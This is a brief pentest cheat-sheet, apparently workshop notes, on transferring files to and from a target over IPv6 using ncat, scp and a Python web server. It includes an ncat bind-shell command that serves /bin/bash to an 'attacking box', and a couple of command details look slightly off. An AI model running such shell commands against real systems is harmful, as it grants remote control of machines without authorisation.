---
description: >-
  Credit to Roxana Kovaci (https://twitter.com/RoxanaKovaci) and her SteelCon
  IPv6 workshop
---

# Transfering files

### **Netcat** 

On the target machine: 

`ncat -6 -vvlp 4433 -e /bin/bash#`  

On your attacking box: 

`ncat -6 -v fe80::37a:61b8:958f:40fb%eth0 4433` 

**Transferring files to and from your target** 

`ncat -6 -vvlp 4433 > test.txt` 

`ncat -6 -v fe80::37a:61b8:958f:40fb%eth0 4433 < test.txt` 

### SCP 

`scp test.txt user@[fe80::37a:61b8:958f:40fb%eth0]:/tmp/`  

`scp user@[fe80::12b:41a7:832a:30bf%eth0]:/tmp/test.txt /home/test/`  

### Web Server

`python -m SimpleHTTPServer6 8080`

